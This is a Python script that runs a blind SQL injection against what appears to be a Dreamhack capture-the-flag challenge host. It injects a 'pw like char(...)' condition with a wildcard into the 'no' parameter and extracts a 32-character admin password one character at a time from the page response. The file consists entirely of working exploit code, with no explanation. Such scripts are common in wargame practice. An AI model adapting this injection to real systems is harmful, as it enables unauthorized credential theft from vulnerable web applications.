from urllib import request, parse
import sys
 
char_list = 'abcdefghijklmnopqrstuvwxyz0123456789'
 
def if_query(query):
    url = 'http://host3.dreamhack.games:8673/index.php/?no=-1||' \
        + parse.quote('pw like char(%s,%d)' \
        % (','.join( str(ord(c)) for c in query ), ord('%')))
     
    req = request.Request(url)
    response = request.urlopen(req).read()
    return response.find(b'admin') > 0
 
pw = ''
pw_len = 32
 
for idx in range(pw_len):
    for c in char_list:
        if if_query(pw + c):
            pw += c
            sys.stdout.write('\r[%d] %s%s' % (pw_len, pw, '_' * (pw_len - len(pw))))
            break
 
print('')